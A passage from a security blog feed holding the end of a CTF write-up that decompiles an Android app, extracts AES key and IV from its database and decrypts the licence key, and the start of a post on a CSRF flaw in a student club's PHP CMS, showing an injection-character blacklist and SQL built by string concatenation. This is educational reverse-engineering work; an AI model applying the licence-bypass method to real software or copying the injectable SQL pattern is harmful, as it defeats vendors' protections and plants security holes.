files are apparently also Zip archives, and we can again <code>unzip</code> it to extract
its contents.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file classes.dex
classes.dex: Dalvik dex file version 035
<span class="nv">$ </span>d2j-dex2jar classes.dex
dex2jar classes.dex -&gt; classes-dex2jar.jar
<span class="nv">$ </span>unzip classes-dex2jar.jar
  <span class="p">&amp;</span>hellip<span class="p">;</span>
  inflating: edu/sharif/ctf/BuildConfig.class
  inflating: edu/sharif/ctf/CTFApplication.class
  inflating: edu/sharif/ctf/R<span class="nv">$attr</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$bool</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$color</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$dimen</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$drawable</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$id</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$integer</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$layout</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$menu</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$string</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$style</span>.class
  inflating: edu/sharif/ctf/R<span class="nv">$styleable</span>.class
  inflating: edu/sharif/ctf/R.class
  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$4</span>.class
  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$5</span>.class
  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$6</span>.class
  inflating: edu/sharif/ctf/config/AppConfig.class
  inflating: edu/sharif/ctf/db/DBHelper.class
  inflating: edu/sharif/ctf/fragments/DListFragment<span class="nv">$1</span>.class
  inflating: edu/sharif/ctf/fragments/ListFragment<span class="nv">$1</span>.class
  inflating: edu/sharif/ctf/fragments/ListFragment<span class="nv">$OnPictureSelectedListener</span>.class
  inflating: edu/sharif/ctf/security/KeyVerifier.class
  <span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>

<p>This produces a TON of various <code>.class</code> files, but the most interesting lie
in the <code>edu/sharif/ctf/</code> directory and are the compiled versions of the actual
code that makes up this app. We can use the <code>jad</code> tool to decompile these back
into Java source and start trying to reverse the product key.</p>

<p>There&rsquo;s a directory in the app source called <code>security/</code> and contains a file
called <code>KeyVerifier.class</code> that seems pretty promising. After decompiling it,
we find a <code>KeyVerifier</code> class with some pretty cool functions.</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isValidLicenceKey</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
<span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">flag</span><span class="o">;</span>
    <span class="k">if</span><span class="o">(</span><span class="n">encrypt</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="n">s1</span><span class="o">,</span> <span class="n">s2</span><span class="o">).</span><span class="na">equals</span><span class="o">(&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="mi">29</span><span class="n">a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;))</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
    <span class="k">else</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="k">return</span> <span class="n">flag</span><span class="o">;</span>
<span class="o">}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
<span class="o">{</span>
    <span class="n">String</span> <span class="n">s3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;&amp;</span><span class="n">rdquo</span><span class="o">;;</span>
    <span class="n">String</span> <span class="n">s4</span><span class="o">;</span>
    <span class="n">SecretKeySpec</span> <span class="n">secretkeyspec</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SecretKeySpec</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s1</span><span class="o">),</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">AES</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">AES</span><span class="o">/</span><span class="n">CBC</span><span class="o">/</span><span class="n">PKCS5Padding</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">secretkeyspec</span><span class="o">,</span> <span class="k">new</span> <span class="nf">IvParameterSpec</span><span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
    <span class="n">s4</span> <span class="o">=</span> <span class="n">bytesToHexString</span><span class="o">(</span><span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
    <span class="n">s3</span> <span class="o">=</span> <span class="n">s4</span><span class="o">;</span>
<span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="nl">L2:</span>
    <span class="k">return</span> <span class="n">s3</span><span class="o">;</span>
    <span class="n">Exception</span> <span class="n">exception</span><span class="o">;</span>
    <span class="n">exception</span><span class="o">;</span>
    <span class="n">exception</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="k">if</span><span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="k">goto</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">L2</span><span class="o">;</span> <span class="k">else</span> <span class="k">goto</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">L1</span>
<span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="nl">L1:</span>
<span class="o">}</span></code></pre></div></p>

<p>It&rsquo;s pretty clear that <code>isValidLicenceKey()</code> is what processes the product key
prompt in the app. The <code>encrypt()</code> function shows us that the first paramter
<code>s</code> is the cleartext to be encrypted, the second parameter <code>s1</code> is the AES
encryption key, and the last parameter <code>s2</code> is the AES
<a href="http://en.wikipedia.org/wiki/Initialization_vector">initialization vector</a>.
After doing a bit of grepping, I confirmed this by decompiling
<code>activities/MainActivity.class</code> and finding this code snippet:</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="n">DialogInterface</span> <span class="n">dialoginterface</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">)</span>
<span class="o">{</span>
    <span class="k">if</span><span class="o">(</span><span class="n">KeyVerifier</span><span class="o">.</span><span class="na">isValidLicenceKey</span><span class="o">(</span><span class="n">userInput</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">(),</span> <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getSecurityKey</span><span class="o">(),</span> <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getSecurityIv</span><span class="o">()))</span>
    <span class="o">{</span>
        <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">updateLicence</span><span class="o">(</span><span class="mi">2014</span><span class="o">);</span>
        <span class="n">MainActivity</span><span class="o">.</span><span class="na">isRegisterd</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
        <span class="n">showAlertDialog</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">Thank</span> <span class="n">you</span><span class="o">,</span> <span class="n">Your</span> <span class="n">application</span> <span class="n">has</span> <span class="n">full</span> <span class="n">licence</span><span class="o">.</span> <span class="n">Enjoy</span> <span class="n">it</span><span class="o">&amp;</span><span class="n">hellip</span><span class="o">;!&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="o">}</span> <span class="k">else</span>
    <span class="o">{</span>
        <span class="n">showAlertDialog</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="o">;</span><span class="n">Your</span> <span class="n">licence</span> <span class="n">key</span> <span class="n">is</span> <span class="n">incorrect</span><span class="o">&amp;</span><span class="n">hellip</span><span class="o">;!</span> <span class="n">Please</span> <span class="k">try</span> <span class="n">again</span> <span class="n">with</span> <span class="n">another</span><span class="o">.&amp;</span><span class="n">rdquo</span><span class="o">;);</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></div></p>

<p>With
this in mind, the code seems to AES encrypt the user input and check if it matches
a certain output. If we had the AES key and IV, we could decrypt the given
output and find the plaintext product key.</p>

<p>Tracing through the calls for the second and third parameters passed into
<code>isValidLicense()</code> I found that
the AES key and IV were stored in the <code>assets/db.db</code> SQLite database I noticed
earlier.</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sqlite3 assets/db.db
 <span class="p">&amp;</span>hellip<span class="p">;</span>
 sqlite&gt; <span class="k">select</span> * from config<span class="p">;</span>
 a           b           c           d           e                 f                                 g           h               i&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt; <span class="m">1</span>           <span class="m">2</span>           <span class="m">2014</span>        <span class="m">0</span>           a5efdbd57b84ca36  37eaae0141f1a3adf8a1dee655853714  <span class="m">1000</span>        ctf.sharif.edu  9</code></pre></div></p>

<p>There are no headers to the columns, but it is pretty obvious that the key
is the longer and the IV is the shorter of the &ldquo;interesting strings&rdquo; in the
database. For further confidence, I can verify this from the decompiled code
in <code>db/DBHelper.class</code>.</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">AppConfig</span> <span class="nf">getConfig</span><span class="o">()</span>
<span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
    <span class="n">AppConfig</span> <span class="n">appconfig</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">AppConfig</span><span class="o">();</span>
    <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">myDataBase</span><span class="o">.</span><span class="na">rawQuery</span><span class="o">(</span><span class="n">SELECT_QUERY</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
    <span class="k">if</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">())</span>
    <span class="o">{</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">flag</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setInstallDate</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">2</span><span class="o">));</span>
        <span class="k">if</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="mi">3</span><span class="o">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="o">;=</span> <span class="mi">0</span><span class="o">)</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setValidLicence</span><span class="o">(</span><span class="n">flag</span><span class="o">);</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setSecurityIv</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">4</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setSecurityKey</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">5</span><span class="o">));</span>
        <span class="n">appconfig</span><span class="o">.</span><span class="na">setDesc</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">7</span><span class="o">));</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">appconfig</span><span class="o">;</span>
<span class="o">}</span></code></pre></div></p>

<p>Using the key, IV and expected encrypted output, I wrote a simple decryption
program.</p>

<p><div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">blah</span> <span class="o">{</span>
    <span class="c1">// omitted for brevity</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesToHexString</span><span class="o">(</span><span class="kt">byte</span> <span class="n">abyte0</span><span class="o">[])</span> <span class="o">{</span> <span class="o">&amp;</span><span class="n">hellip</span><span class="o">;</span> <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">hexStringToBytes</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span> <span class="o">&amp;</span><span class="n">hellip</span><span class="o">;</span> <span class="o">}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
<span class="o">{</span>
    <span class="n">SecretKeySpec</span> <span class="n">secretkeyspec</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SecretKeySpec</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s1</span><span class="o">),</span> <span class="s">&quot;AES&quot;</span><span class="o">);</span>
    <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="o">);</span>
        <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">Cipher</span><span class="o">.</span><span class="na">DECRYPT_MODE</span><span class="o">,</span> <span class="n">secretkeyspec</span><span class="o">,</span> <span class="k">new</span> <span class="nf">IvParameterSpec</span><span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s</span><span class="o">));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span><span class="o">;</span>
    <span class="n">String</span> <span class="n">iv</span> <span class="o">=</span> <span class="s">&quot;a5efdbd57b84ca36&quot;</span><span class="o">;</span>
    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;37eaae0141f1a3adf8a1dee655853714&quot;</span><span class="o">;</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">decrypt</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">iv</span><span class="o">));</span>
<span class="o">}</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;}</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>java blah
fl-ag-IS-se-ri-al-NU-MB-ER</code></pre></div></p>

<p>Thanks for reading!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing Admin Privileges via CSRF]]></title>
    <link href="http://mark.systems/blog/2014/09/11/csrf-news/"/>
    <updated>2014-09-11T00:00:00-04:00</updated>
    <id>http://mark.systems/blog/2014/09/11/csrf-news</id>
    <content type="html"><![CDATA[<p><em>Exploiting a classic CSRF vulnerability</em></p>

<p>When I took over responsibility as the webmaster for
<a href="http://www.ieee.neu.edu">Northeastern University&rsquo;s IEEE student chapter</a> around
January 2014 (yes, this is a very belated post), I was suddenly reponsible for
maintaining a custom LAMP stack Content Management System (CMS) whose core
functionality was letting an admin post to a news feed on the front page of the
site.
This site has since been completely redone, but given that it is notoriously
difficult to program securely in PHP, I decided to poke around a little and
see if I could find any cool bugs.</p>

<p>Initially, I started looking for the most blatant web vulns, SQLi and XSS, but
was pleasantly surprised to find in the <code>register.php</code> file, for example, that
handles user registration, to find a input sanitation check.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">((</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newusername</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newpassword</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])))</span>
<span class="p">{</span>
    <span class="c1">// continue with registration</span>
<span class="p">}</span></code></pre></div></p>

<p>where <code>isValid()</code> looks like</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isValid</span><span class="p">(</span><span class="nv">$varx</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="nv">$bad_stuff</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="c1">#&amp;rdquo;,&amp;ldquo;(&amp;rdquo;,&amp;ldquo;)&amp;rdquo;,&amp;ldquo;&amp;lt;&amp;rdquo;,&amp;ldquo;&gt;&amp;rdquo;,&amp;ldquo;?&amp;rdquo;,&amp;ldquo;/&amp;rdquo;,&amp;ldquo;\&amp;rdquo;,&amp;ldquo;[&amp;rdquo;,&amp;ldquo;]&amp;rdquo;,&amp;ldquo;|&amp;rdquo;,&amp;ldquo;$&amp;rdquo;,&amp;ldquo;&amp;lsquo;&amp;rdquo;,&amp;ldquo;:&amp;rdquo;,&amp;ldquo;;&amp;rdquo;, &amp;ldquo;@&amp;rdquo;);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$index</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$varx</span><span class="p">);</span> <span class="nv">$index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span><span class="nv">$index</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="nv">$bad_stuff</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$valid</span><span class="p">;</span>
<span class="p">}</span></code></pre></div></p>

<p>This code has a pretty substantial blacklist of commonly used characters in
injections and operates by iterating over each character of the questionable
input and testing if the character is in the blacklist, if so, setting the
<code>$valid</code> variable to false. This seems to be an effective technique at ensuring
the input is safe to use, however OWASP tends to <a href="https://www.owasp.org/index.php/Data_Validation#Data_Validation_Strategies">discourage</a>
this model.</p>

<p>After ruling this out of potential vulns, I looked a little deeper into the code
that powered the posting of news to the website, <code>add-news.php</code>.</p>

<p>Here we can see that if the HTTP request is a &ldquo;POST&rdquo; and the PHP session variables
&ldquo;isadmin&rdquo; and &ldquo;isofficer&rdquo; are set to &ldquo;yessir&rdquo; and &ldquo;true&rdquo; respectively, then
the code that adds news gets executed.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">REQUEST_METHOD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">POST</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
    <span class="p">{</span>
        <span class="k">include</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ieee</span><span class="o">-</span><span class="nx">lib</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span> <span class="o">||</span> <span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">yessir</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="k">true</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
            <span class="p">{</span>
                <span class="c1">// add news</span></code></pre></div></p>

<p>After these access checks pass, the POST request data is processed and
ultimately a SQL query string is generated.</p>

<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// continued from above</span>
<span class="nv">$title</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">news_title</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
<span class="nv">$text</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">post</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
<span class="p">{</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="p">}</span> <span class="c1">// some omitted stuff</span>
<span class="nv">$user_query</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="nx">user_id</span><span class="p">,</span> <span class="nx">username</span> <span class="nx">FROM</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$INFO</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">sql_prefix</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">.</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">users</span> <span class="nx">WHERE</span> <span class="nx">username</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&amp;rsquo;] . &amp;ldquo;&amp;lsquo;&amp;rdquo;;</span>
<span class="s1">$user_result = mysql_query($user_query);</span>
<span class="s1">if($user_result)</span>
<span class="s1">{</span>
<span class="s1">    //Returns an array with the data from the SQL select statement</span>
<span class="s1">    $user_row = mysql_fetch_row($user_result);&lt;/p&gt;</span>

<span class="s1">&lt;pre&gt;&lt;code&gt;$query1 = &quot;INSERT INTO &quot; . $INFO[&#39;</span><span class="nx">sql_prefix</span><span class="s1">&#39;] . &quot;news (news_title, news_type, time_posted, time_meeting, news_body, author_id, author_name, meeting_location) &quot;;</span>
<span class="s1">$query2 = &quot;VALUES (&#39;</span><span class="s2">&quot; . </span><span class="si">$title</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$type_of_news</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . time() . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$time_of_meeting</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$text</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[0]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[1]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$meetinglocation</span><span class="s2"> . &quot;</span><span class="s1">&#39;)&quot;;</span>
<span class="s1">$add_news_query = $query1 . $query2;</span>
